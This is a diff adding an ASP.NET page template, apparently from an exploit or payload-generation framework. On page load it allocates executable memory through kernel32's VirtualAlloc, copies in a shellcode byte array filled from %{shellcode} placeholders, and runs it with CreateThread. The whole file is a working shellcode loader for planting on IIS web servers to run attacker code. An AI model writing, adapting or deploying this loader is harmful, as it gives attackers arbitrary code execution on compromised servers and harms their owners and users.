@@ -1,0 +1,21 @@
+<%%@ Page Language="C#" AutoEventWireup="true" %%>
+<%%@ Import Namespace="System.IO" %%>
+<script runat="server">
+    private static Int32 MEM_COMMIT=0x1000;
+    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
+
+    [System.Runtime.InteropServices.DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
+
+    [System.Runtime.InteropServices.DllImport("kernel32")]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
+
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        %{shellcode}
+        IntPtr %{var_funcAddr} = VirtualAlloc(IntPtr.Zero,(UIntPtr)%{var_bytearray}.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        System.Runtime.InteropServices.Marshal.Copy(%{var_bytearray},0,%{var_funcAddr},%{var_bytearray}.Length);
+        IntPtr %{var_threadId} = IntPtr.Zero;
+        IntPtr %{var_hThread} = CreateThread(IntPtr.Zero,UIntPtr.Zero,%{var_funcAddr},IntPtr.Zero,0,ref %{var_threadId});
+    }
+</script>
